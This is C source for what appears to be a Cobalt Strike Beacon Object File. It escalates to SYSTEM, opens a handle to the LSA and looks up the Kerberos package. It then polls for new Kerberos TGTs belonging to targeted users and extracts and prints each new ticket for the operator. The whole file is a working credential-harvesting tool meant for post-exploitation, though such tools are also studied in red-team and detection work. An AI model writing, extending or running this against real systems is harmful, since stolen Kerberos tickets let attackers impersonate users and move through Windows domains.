#include <windows.h>
#include "beacon.h"
#include "common.h"
#include "common.c"

VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CACHE curr) {
    BOOL cacheUpdated = FALSE;

    for (int i = 0; i < curr->count; i++) {
        PTICKET_ENTRY currEntry = &curr->tickets[i];
        BOOL found = FALSE;
        for (int j = 0; j < prev->count; j++) {
            PTICKET_ENTRY prevEntry = &prev->tickets[j];
            if (
                currEntry->luid.LowPart  == prevEntry->luid.LowPart  &&
                currEntry->luid.HighPart == prevEntry->luid.HighPart  &&
                MSVCRT$strcmp(currEntry->spn, prevEntry->spn) == 0
            ) {
                found = TRUE;
                break;
            }
        }

        if (!found) {
            WCHAR wspn[256] = { 0 };
            toWideChar(currEntry->spn, wspn, sizeof(wspn));
            UNICODE_STRING target = {
                .Buffer = wspn,
                .Length = (USHORT)(MSVCRT$wcslen(wspn) * 2),
                .MaximumLength = (USHORT)(MSVCRT$wcslen(wspn) * 2 + 2)
            };

            PrintTicketInformation(currEntry, "Found new TGT");

            PBYTE ticket = NULL;
            ULONG ticketSize = 0;
            if (NT_SUCCESS(ExtractTicket(hLsa, authPackage, currEntry->luid, target, &ticket, &ticketSize)) && ticket && ticketSize) {
                PrintTicket(ticket, ticketSize);
                MemFree(ticket);
            }
            cacheUpdated = TRUE;
        }
    }
    if (cacheUpdated) {
        bprintf("\n[*] Ticket cache size: %d\n", curr->count);
        bflush();
        BeaconWakeup();
    }
}

VOID go(char* args, int argc) {
    datap parser = { 0 };
    HANDLE hStop = BeaconGetStopJobEvent();

    g_out    = (char*)MemAlloc(OUTBUFSIZE);
    g_outLen = 0;
    if (g_out) g_out[0] = '\0';

    BeaconDataParse(&parser, args, argc);
    int interval = BeaconDataInt(&parser);
    char* targetUsers = BeaconDataExtract(&parser, NULL);

    if (!IsSystem()) {
        HANDLE hToken = EscalateToSystem();
        if (!hToken) {
            bprintf("[-] Must be run as NT AUTHORITY\\SYSTEM.\n");
            bflush();
            return;
        }
        ADVAPI32$SetThreadToken(NULL, hToken);
        KERNEL32$CloseHandle(hToken);
    }

    HANDLE hLsa = 0;
    if (!NT_SUCCESS(GetLsaHandle(&hLsa)))
        return;

    ULONG authPackage = 0;
    LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
    if (!NT_SUCCESS(SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage))) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }

    bprintf("[*] Starting TGT monitor (interval: %ds)\n", interval);
    if (targetUsers && targetUsers[0] != '\0')
        bprintf("[*] Target users: %s\n", targetUsers);
    bflush();
    BeaconWakeup();

    TICKET_CACHE prev = { 0 };
    TICKET_CACHE curr = { 0 };

    do {
        if (NT_SUCCESS(EnumerateTGTs(hLsa, authPackage, targetUsers, &curr))) {
            RefreshCache(hLsa, authPackage, &prev, &curr);
            if (prev.tickets)
                MemFree(prev.tickets);
            prev = curr;
            curr = (TICKET_CACHE){ 0 };
        }

        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, interval * 1000, FALSE);
        if (wait == WAIT_OBJECT_0 || wait != WAIT_TIMEOUT)
            break;

    } while (TRUE);

    if (prev.tickets)
        MemFree(prev.tickets);
    if (curr.tickets)
        MemFree(curr.tickets);
    SECUR32$LsaDeregisterLogonProcess(hLsa);

    ADVAPI32$RevertToSelf();

    bprintf("\n[+] BOF execution completed.\n");
    bflush();
    if (g_out && g_out != (char*)1) MemFree(g_out);
    g_out = (char*)1; g_outLen = 1;
}
